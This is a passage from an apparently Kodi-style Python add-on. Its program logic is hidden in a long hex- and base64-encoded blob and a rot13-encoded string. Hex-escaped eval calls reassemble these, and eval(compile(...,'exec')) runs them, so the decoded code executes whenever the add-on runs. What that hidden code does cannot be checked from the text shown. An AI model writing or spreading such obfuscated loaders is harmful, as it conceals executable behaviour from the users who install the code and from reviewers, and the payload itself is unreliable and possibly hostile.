NDg2NDQyN2E1OTMyNjQ0NDM1NDg2MzY2NDI2ZDUwMzU2ZDYxNGM3ODZiNmQ2ODc0NmY1MTU1N2EzNzcwNjI3MTM3NjU2ODM0NjY1MTUwMmYzMjM3NDIzOTc3NTQ0MTc2MmI2OTZhNjg2ODc2NjQ3NTYxNTA2ODc4NzAyYjY5NTg1ODY1NjM2NzJmNzQ1YTYxNTAzNjYzNTc3NzQzMzI3MTM0NmE1MDUwNzE0NDcyNTI2ODQzMmY1Mzc2MzM2NjUyNGE1YTMzMmYzNjQ1MzY2ODYyNzE0NDRlNzc2NjQ5NDQ3MDc2NGM1OTJiNTg3MzY2MzU2ZDMyNmQ1NDY2NDE3NzRiNjQ0NTUxMmIzOTZjNjE3OTM3NjI2OTJmNTI0MzM3NDc2YjUzNjY0NTQxNjQ2NjMzNDE3NjU0NzczMDM1NTAzMjcxNzY0ZDMwMzY3NjQ1MzAzMDZlMzc0OTc4MzAzMjM0NTA3MjQ0NTc2ZDc2NjE0NjU5NzczMzczNjQ3OTc1NDgzNDc4NDMzNjZlNmQ2ODM2NGY2ODM4NTQ0ZDRjNmUyYjM5NjE0NDUwNmY2ZDQ3Mzg3ODZlNzQzMDJmMzM2YTQ3MmIyZjZlMzQ0MjM5NjQ2YTU3NzIzODQ2MmI3MzZmNDc0ZjQ5NzUzNjQyNjY1MTc1NTg0MzM5NDI1MjdhNzc3MjYyNjYzOTZlNzY1OTcyNmE1OTZmNjk0MjZhNDc2YzY0NjY0Njc3NGM2MzY1NDc0MTU3Njc0NTM2NGY2ZjM1NGU3OTRmNjY3ODZlNjE0ZjY4NzE2MzRjNDg3MDMzMzAzNDU0NzEzMDZlNGM2NDRjNmI2NTRlNTYzMDUzNDgzMDM4NTQ2NDY0NTE1NDJmN2E0ODczNTk0YzM2NTM2MjM5NDc2ZTQxNDczMzZiNGM2NTY2NzgyYjQ0NTE0MzdhNTkzNzZlNTk3NDQyNTIyYjY0MmI0NTM4NjM1MTUzNmUzMTU1NDE0NDZhNzYzNDY2Njc1NjM1NzUzMDYxNTQ3ODcxMzg3YTY2NTIzODcwNzYzMzc0MmI0ZTZhNmE0MzcyNjcyYjUzNmIzMDZhNjQ0ZDcwNTIzOTdhNmIzNDQ0Njg0ODdhMzg1NTU4NmMzODUwNDU1MTMxNGI0NDYzNjY3OTZhNTE3NTZhNTE3NDMxMzM3MjQ3NGUzMjY5NzM0ZTc1NjY2ODMxNGU1NzMwNzM3ODU0NDgzNjU1NzE2ZDJmMzY0NTc1MzU2ZDRkMzc2ZDczMzQyYjcyNzAzOTM1NmQ3NjMyNmQ1MTZhMzI0MzRmNmY0YzdhNDY0ZDM5NGMzNjU3NGY2MjZmNGY0ZDVhMmI3MjY5NDM3ODc1NmI1NjQ4MzQ2NDUyNmQ3NjM3NzQ2ZjU3NjU0Mzc2MmY0NTUyNzU0ODM2NmM2YTc4MzM3MTc2NDY3NDc4NTA0OTRhNGYzMzJmNGYzNjQyNGY0YzQ1MzQzNzdhNWE2MTMzNmY3MDY1NmU2YTY3NGI1MDQ5NGIzMDMwNTI3NDUwNmQzNjQzNzY0MTY2MzgzMTYyNTI2ZTU4NjcyZjY4NTA0OTRlNmE2YjU5Nzg0NDc5NTA3NDYxNjIzMDc3MzUzNTU3NGY2ODY2NDM3ODZkNzk2ZTM3NTA2NDU0NTg3MTUxMmYzMjJiNmM2NTM0NjY0ZTRjMzY0ZTczNDQzODY2NjczODU1Nzg1MzQ0MzczMjc4NjY1MjQxNzA3NjUwNjk1MDU0Njg1MzY5NTg3NzQ4MmI3YTQ4NjU2MTU2Nzg0NzMzMzg1NDM0Njg0Njc5NDg0ZjZmNjYzODZjMmY3MzQ5NzA1OTJiNTg0ZDZlMzA1MDM4NzY0NjUyNGU2NDZhNTc1OTUwMzE1NzUyMzQ0ZjY2NTE2NjJiNTAyZjRlNzEzNDZkNjg2MTUwNTk3OTQ0NjM1MjJiNzE2YTY0NmIzODYxNGEyZjY0Mzg1ODQ5NjY3YTJiMzI0ZjRmNDQzNjM3NDQ1NTU4Mzk3ODZlNGU1MzM2NGM2OTYyMzg2NjUyMzc1NDc3NTg0NjU3NzA3Mzc2NzI1MDRkNjUzMDJiNTIzNzM1Njc0ZTY1NTQzMDQzNjM2NzdhNmM0ZTcwNTAzOTYzNmM0MjcyMzI0ZjYzNDU1MTJiNmQ2YTRhMzI2MzQ2MzI0ZDJiNjc0MTMwNjE3YTM2MzIzMDZkNGUzODM5NDQ3NjM2NDc0OTYxNmQ2NjYxMzU0MjRiMzA1NDJmN2EzODYzNTQ1MTUwNjY0NTRkNTM3NjU1MzczNjY4N2E1NTUyMmY3MzU5NDg2NjQzNDk2MTcwNzI3NTYxMzU0MjJmNzc1MzM4NGEzNzZiNzQzOTM3NmU2NTY3NTAzNDY1MmI0ZDQyMzQ3MjZmMmY0NDZmNGMzNzY3NTkzMjY1NmM3MjU5MmI2ODM4NDg0NTc0NjUzNjMzNzA2ZjU2Njg0ODYxNDQ2OTY1NmQ0MjM2NGY0ZTU0NTg1MTQ4NGM2ZDY1NzMyZjU1Nzg0ZTQyNzgzNzRmNmQ3MDM2MzU'
keymaker = '0LwWzZmD1ZGWzZmp2LGH5AmxmBGEvAQt3BQD4ZmV1AGEuZzL2LGZlAQL2ZGMvAzRlLwZ2AzZ3ZGD4AmH1BGHjAmLmZwplAQt3ZGHmZmt2BQp2AzR0AGpmAGZ3ZwD3AQVmZQZmAGNmZGMxAmD0ZGEzAmDmAmHlAGt3LGHkATV3AwZ1ATH2AQHkATHlLwD4AGt1AQEwAwDmZGWvAJRmBQLlAQt0MQDmAmL0AmHkZmL2ZmExAmV0BQL1ATZ0Amp1AJR2AwD0Amt0AwEzZmL3ZQMxATZmAmExATH0Amp3ZzV3ZmMwAzR0ZwZmZzV0AQZmAmp0AwL2AGR1AGD0ATH2AGD4Zmx0AGZkAzRlLwEwAzR1ZmLkAmD0LwplZmx0AmDlAGt2AmZ4ZmL0MGHjAwZ1BQp5AQVmBGWzAwLmBQp3Awp1LGH0AmZ2ZGH0AQt2AQZkAmH0LmZ1ZmH2AmD4AwRmAwWvAzV1AGD4AGD1LGMxAGp2BGplAmt2AmZ4AzR2BQExAwZmZQLlAwD1ZGL2AQt0MGL0AGR1ZQZ2AQH3ZwplZzL2LGZ5ZmxlMwpkAmpmBGD0AmZmAwZ4AGN0MGZ2AmtmZQL3AzRlMwMwAwt1ZGLlA2R0BQLlAQH0MwWvZmV0ZGWvAzV3BGD1AwHmAmMuAwLmBGLlAGV1BQL3AQV1AQEwAGN0LwD3AGR3AGMzAmp0BGL2AwZ3AGHmZzL0LmLlAzL0MwMyAmH2ZGZmZmt0LmZ3ATLmAQHkATH3ZwZlAGZ0AwZ0AzL1ZQHlAwV1BGHlAwR1ZQH2AmL0MQp0AQtlLwDkAGL3BQL0AGxmBQZ4AzVmZGHmAzR0MwLlAGV2LGH5ZmL2Lmp3AQDmBGpmAQZ3ZGquAmtmZmp2AGt3LGHlAGZ0MGD5AwD2AGD0ATHmBQH4AzL3AQL1ATRmAGHlAQZmAGZ0AzRlLwD5AQx0AmWzAGDmZQDlAGNmAwWvAQR1BQExA2R0BQp4ATH2Mwp4AmLmZmLmAwx0BGp2AQD2ZwZmAQplLwpmZmt1AQD5AGN0AQD2Amx3ZGL4Zmx3ZmquATH3BQD2AmV3LGDkZmt2AwLkZzV2MwZjAwtmAQZkAGV2AGEzAQZ1ZwZ4AzR3ZGZmZmH3ZQZjZmRlMwL4AzZmBQEzZmZ0AQL1Amt0ZGL3AJR2MGHmAzVmAQL2AzD0BQMuAwp0BGWzAQt3AwDmAmV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'
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))

if __name__ == '__main__':
    router(sys.argv[2][1:])
